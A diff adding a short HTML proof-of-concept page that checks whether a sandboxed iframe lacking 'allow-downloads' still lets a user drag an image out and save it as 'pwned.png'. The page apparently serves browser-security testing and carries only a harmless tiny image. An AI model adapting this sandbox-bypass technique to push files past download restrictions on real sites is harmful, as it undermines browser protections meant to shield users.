@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Sandboxed Iframe Drag-and-Drop Download PoC</title>
+</head>
+<body>
+  <h2>PoC: Drag the image out of the iframe</h2>
+  <p>
+    Expected: Sandbox without <code>allow-downloads</code> should block file download.  
+    Vulnerable: If you can drag this image to your desktop and it saves as <code>pwned.png</code>.
+  </p>
+
+  <iframe
+    sandbox
+    width="320"
+    height="220"
+    srcdoc="
+      <style>
+        body { font-family: sans-serif; text-align: center; }
+        img { border: 3px solid red; cursor: grab; }
+      </style>
+      <h3>Drag Me Out</h3>
+      <img
+        src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAFklEQVR42mNk+M9Qz0AEYBxVSFUBAA0FAf/XHEujAAAAAElFTkSuQmCC'
+        download='pwned.png'
+        draggable='true'
+        alt='Test Image'
+      >
+      <p>Drag this image to your desktop</p>
+    ">
+  </iframe>
+</body>
+</html>
